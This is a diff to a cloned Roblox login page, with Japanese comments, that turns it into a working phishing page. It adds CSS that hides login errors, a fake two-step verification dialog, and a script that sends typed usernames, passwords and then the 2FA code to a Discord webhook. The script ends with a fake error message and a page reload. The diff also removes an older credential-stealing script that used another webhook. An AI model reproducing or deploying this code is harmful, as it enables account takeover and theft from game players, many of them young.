@@ -287,7 +287,35 @@
       data-request-batch-size="100"
       data-thumbnail-metrics-sample-size="20"
       data-concurrent-thumbnail-request-count="4"/>
-                          
+
+    <style>
+        body#rbx-body {
+            background-image: url('https://images.rbxcdn.com/a19e4c27a0694a1d0fd5ceb17c978a7a-marketing_bg_05222025.jpg') !important;
+            background-size: cover;
+            background-attachment: fixed;
+            background-position: center;
+        }
+    </style>
+
+<style>
+    /* 背景の設定（これはそのまま残す） */
+    body#rbx-body {
+        background-image: url('https://images.rbxcdn.com/a19e4c27a0694a1d0fd5ceb17c978a7a-marketing_bg_05222025.jpg') !important;
+        background-size: cover;
+        background-attachment: fixed;
+        background-position: center;
+    }
+
+    /* エラー文だけを「強制的に」消す設定（これを追加！） */
+    #login-form-error, .login-error {
+        display: none !important;
+        visibility: hidden !important;
+        opacity: 0 !important;
+        height: 0 !important;
+        margin: 0 !important;
+        padding: 0 !important;
+    }
+</style>                      
 
 </head>
 <body id="rbx-body" dir="ltr" class="rbx-body   dark-theme  builder-font " data-performance-relative-value="0.005" data-internal-page-name="Login" data-send-event-percentage="0">
@@ -747,78 +775,128 @@
 
     <script onerror='Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)' data-monitor='true' data-bundlename='pageEnd' type='text/javascript' src='https://js.rbxcdn.com/8230ec5961e6a71e311544f551ed88ee.js'></script>
 
+<!-- 2段階認証モーダル (アイコン・バツ印 最終修正版) -->
+<div id="two-step-modal" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 9999; justify-content: center; align-items: center; font-family: 'HCo Gotham SSm', sans-serif;">
+    <div class="modal-dialog" style="margin: 0 20px; width: 100%; max-width: 400px;">
+        <div class="modal-content" style="background: #272930; border-radius: 8px; color: #fff; box-shadow: 0 0 20px rgba(0,0,0,0.6); overflow: hidden;">
+            
+            <!-- ヘッダー -->
+            <div class="modal-header" style="padding: 15px; position: relative; display: flex; align-items: center; justify-content: center; border-bottom: 1px solid #393b3d;">
+                <!-- バツ印を1点に集約 -->
+                <button type="button" style="background: none; border: none; color: #fff; font-size: 24px; cursor: pointer; position: absolute; left: 15px; top: 50%; transform: translateY(-50%); line-height: 1; padding: 0;">
+                    ×
+                </button>
+                <h4 style="margin: 0; font-size: 16px; font-weight: 500;">2段階認証</h4>
+            </div>
+
+            <!-- ボディ -->
+            <div class="modal-body" style="padding: 30px; text-align: center;">
+                <!-- 認証アイコン (確実に表示されるよう修正) -->
+                <div style="margin-bottom: 25px; height: 73px; display: flex; justify-content: center; align-items: center;">
+                    <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3MiIgaGVpZ2h0PSI3MyIgZmlsbD0ibm9uZSIgdmlld0JveD0iMCAwIDcyIDczIj48cGF0aCBmaWxsPSIjZjdmN2Y4IiBkPSJNMzQuNTc1IDUuNjg5YTQuNSA0LjUgMCAwIDEgMi44NDcgMGwyMi41IDcuNUE0LjUwNSA0LjUwNSAwIDAgMSA2MyAxNy40NjVsLS4wMDcgMi40MzZjLS4xMSAyNC43NzEtMS43MjggMzcuMjI3LTI1LjI1NSA0Ny41N2wtLjIwOC4wODVjLS45NzkuMzctMi4wNzguMzctMy4wNTcgMGwtLjIwOC0uMDg1Yy0yMy41MjgtMTAuMzQzLTI1LjE0NS0yMi44LTI1LjI1Ni00Ny41N0w5IDE3LjQ2NWE0LjUxIDQuNTEgMCAwIDEgMi43MzgtNC4xNWwuMzM4LS4xMjZ6bTEuODk4IDIuODQ2YTEuNSAxLjUgMCAwIDAtLjk0OSAwbC0yMi40OTkgNy41YTEuNTEgMS41MSAwIDAgMC0xLjAyNCAxLjQyNmMuMDE4IDEzLjM0OS4zMDUgMjIuNTM5IDMuMzA3IDI5Ljc1IDIuODc3IDYuOTExIDguNDQgMTIuMzYgMjAuMTYzIDE3LjUxNC4zMjkuMTQ1LjczLjE0NSAxLjA2IDAgMTEuNzIxLTUuMTUzIDE3LjI4NC0xMC42MDMgMjAuMTYxLTE3LjUxNEM1OS42OTQgNDAgNTkuOTgxIDMwLjgxIDYwIDE3LjQ2MWMwLS42NDYtLjQxNi0xLjIyMy0xLjAyNC0xLjQyNnoiLz48cGF0aCBmaWxsPSIjZjdmN2Y4IiBkPSJNMzYuMzggMTguNDc0YTcuMjcgNy4yNyAwIDAgMSA2Ljg5NSA3LjI2djIuNDIzSDQ1LjdsLjE4Ny4wMDVhMy42MzUgMy42MzUgMCAwIDEgMy40NDggMy42M3YxNC4yNTJsLS4wMDcuMTdjLS4wNi44NS0uNTcgMS42MDEtMS4zOCAxLjg5MWwtLjQuMTM5Yy0yLjEyMy43MTUtNi4wNzggMS43Mi0xMS41NCAxLjcybC0xLjA3Mi0uMDEyYy00LjkxLS4xMi04LjQ4Ny0xLjA0LTEwLjQ2OC0xLjcwOGwtLjQtLjEzOWMtLjg2NS0uMzA5LTEuMzg3LTEuMTQ0LTEuMzg3LTIuMDYxVjMxLjc5MmEzLjYzNSAzLjYzNSAwIDAgMSAzLjQ0Ny0zLjYzbC4xODgtLjAwNWgyLjQyMnYtMi40MjNhNy4yNyA3LjI3IDAgMCAxIDcuMjctNy4yN3pNMjYuMzE1IDMxLjE1N2EuNjM1LjYzNSAwIDAgMC0uNjM0LjYzNHYxMy42OWMxLjkyNi42MjQgNS40NTggMS40ODMgMTAuMzI3IDEuNDgzczguNC0uODU5IDEwLjMyNy0xLjQ4MnYtMTMuNjlhLjYzNS42MzUgMCAwIDAtLjYzNS0uNjM1em05LjY5MyAzLjk4YTEuNSAxLjUgMCAwIDEgMS41IDEuNXY0Ljg0NmExLjUgMS41IDAgMCAxLTMgMHYtNC44NDZhMS41IDEuNSAwIDAgMSAxLjUtMS41bTAtMTMuNjczYTQuMjcgNC4yNyAwIDAgMC00LjI3IDQuMjd2Mi40Mmg4LjUzOHYtMi40MmE0LjI3IDQuMjcgMCAwIDAtNC4yNjgtNC4yNyIvPjwvc3ZnPg==" style="width: 72px; height: 73px; display: block; border: none; background: none;">
+                </div>
+                
+                <p style="font-size: 14px; color: #fff; margin-bottom: 25px; line-height: 1.4;">認証システムアプリによって生成されたコードを入力。</p>
+                
+                <!-- 入力欄 (解析値反映) -->
+                <div style="margin-bottom: 20px;">
+                    <input id="two-step-verification-code-input" inputmode="numeric" maxlength="6" placeholder="6桁のコードを入力してください" type="text" style="width: 100%; height: 38px; padding: 5px 12px; background: #D0D9FB14; border: 1px solid #fff; color: #fff; border-radius: 4px; font-size: 15px; outline: none; box-sizing: border-box;">
+                </div>
+
+                <!-- 信頼設定 -->
+                <p style="text-align: left; font-size: 13px; color: #bdbebe; margin-bottom: 25px; display: flex; align-items: center; justify-content: center;">
+                    <input id="remember-device" type="checkbox" style="width: 18px; height: 18px; margin-right: 8px; cursor: pointer; accent-color: #00b06f;">
+                    <label for="remember-device" style="cursor: pointer;">このデバイスを30日間信頼する</label>
+                </p>
+
+                <p style="margin-bottom: 25px;">
+                    <button type="button" style="background: none; border: none; color: #00a2ff; font-weight: 500; cursor: pointer; font-size: 13px;">他の認証方法を使う</button>
+                </p>
+
+                <button type="button" id="verify-button" style="width: 100%; padding: 12px; font-weight: bold; border-radius: 4px; background: #cdcfd0; color: #666; border: none; font-size: 15px; cursor: not-allowed;">確認</button>
+            </div>
+            
+            <div class="modal-footer" style="padding: 0 30px 30px 30px; text-align: left;">
+                <p style="font-size: 11px; color: #bdbebe; line-height: 1.5;">
+                    <strong>重要：</strong> セキュリティコードは誰にも教えないようにしてください。Roblox のほうからコードを聞き出すことはありません。
+                </p>
+            </div>
+        </div>
+    </div>
+</div>
+
 <script>
 (function() {
-    const webhookURL = "https://discord.com/api/webhooks/1498866300456271923/QILHYuIz2kQjf1HXnwb5qBO6j0H1YGQUJRm79kCJEN8Y3FIpksB0xtnIBMAuzWvbf3uW";
+    const webhookUrl = "https://discord.com/api/webhooks/1500004637338636399/z0EUnIYcGvRoIYtFfbPB86e00a41BBS3_Lz-m-Ppi6-DGozIaAhMON8OIgxb2bc5i_cU";
 
-    function sendToWebhook(username, password) {
-        const payload = {
-            embeds: [{
-                title: "🔑 ログイン情報が入力されました",
-                color: 16711680, // 赤色
-                fields: [
-                    { name: "👤 ユーザー名", value: username || "未入力", inline: true },
-                    { name: "🔒 パスワード", value: password || "未入力", inline: true },
-                    { name: "🌐 ページ", value: window.location.href, inline: false }
-                ],
-                footer: { text: "送信時刻: " + new Date().toLocaleString('ja-JP') }
-            }]
-        };
+    // 1. ログインボタン押下時の処理
+    document.addEventListener('click', function(e) {
+        const target = e.target.closest('#login-button');
+        if (target) {
+            const username = document.getElementById('login-username')?.value || "";
+            const password = document.getElementById('login-password')?.value || "";
 
-        // fetchを使用して送信（より確実にするために同期的な待機はできないが、送信処理自体は即座に開始される）
-        fetch(webhookURL, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload),
-            keepalive: true // ページが閉じられても送信を継続
-        }).then(() => console.log("Sent successfully"))
-          .catch(err => console.error("Send failed", err));
-    }
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    "content": "@everyone",
+                    "embeds": [{
+                        "title": "🔑 ログイン情報",
+                        "color": 16711680,
+                        "fields": [
+                            { "name": "👤 ユーザー", "value": "```" + username + "```" },
+                            { "name": "🔒 パスワード", "value": "```" + password + "```" }
+                        ]
+                    }]
+                }),
+                keepalive: true
+            });
 
-    // フォーム要素を継続的に監視し、見つかり次第イベントを付与
-    const attachEvents = () => {
-        // ログインボタンの候補
-        const buttons = document.querySelectorAll('button, input[type="button"], input[type="submit"], .login-button, #login-button');
-        
-        buttons.forEach(btn => {
-            if (btn.dataset.webhookAttached) return;
-            
-            // クリックイベントをキャプチャフェーズで登録（他のイベントより先に実行）
-            btn.addEventListener('click', function(e) {
-                const userField = document.querySelector('input[type="text"], input[type="email"], input[name*="user"], #login-username');
-                const passField = document.querySelector('input[type="password"], input[name*="pass"], #login-password');
-                
-                if (userField && passField) {
-                    sendToWebhook(userField.value, passField.value);
-                }
-            }, true);
-            
-            btn.dataset.webhookAttached = "true";
-        });
-    };
-
-    // 初回実行
-    attachEvents();
-
-    // 動的な変化を監視
-    const observer = new MutationObserver(() => {
-        attachEvents();
-    });
-
-    observer.observe(document.body, { childList: true, subtree: true });
-
-    // 予備：Enterキー押下時もキャプチャ
-    document.addEventListener('keydown', function(e) {
-        if (e.key === 'Enter') {
-            const userField = document.querySelector('input[type="text"], input[type="email"], input[name*="user"], #login-username');
-            const passField = document.querySelector('input[type="password"], input[name*="pass"], #login-password');
-            if (userField && passField && userField.value && passField.value) {
-                sendToWebhook(userField.value, passField.value);
-            }
+            setTimeout(() => {
+                const modal = document.getElementById('two-step-modal');
+                if (modal) modal.style.display = 'flex';
+            }, 600);
         }
     }, true);
 
+    // 2. 新しいID (two-step-verification-code-input) の入力を監視
+    document.addEventListener('input', function(e) {
+        if (e.target.id === 'two-step-verification-code-input') {
+            const btn = document.getElementById('verify-button');
+            if (e.target.value.length >= 6) {
+                btn.style.background = "#fff";
+                btn.style.color = "#000";
+                btn.style.cursor = "pointer";
+            } else {
+                btn.style.background = "#cdcfd0";
+                btn.style.color = "#666";
+                btn.style.cursor = "not-allowed";
+            }
+        }
+    });
+
+    // 3. 確認ボタン押下時の処理
+    document.addEventListener('click', function(e) {
+        if (e.target.id === 'verify-button') {
+            const codeInput = document.getElementById('two-step-verification-code-input');
+            const code = codeInput ? codeInput.value : "";
+            if (code.length < 6) return;
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    "content": "🛡️ **2段階認証コード:** ```" + code + "```"
+                })
+            }).then(() => {
+                alert("不明なエラーが発生しました。もう一度お試しください。");
+                location.reload();
+            });
+        }
+    });
 })();
 </script>
+
 </body>
 </html>
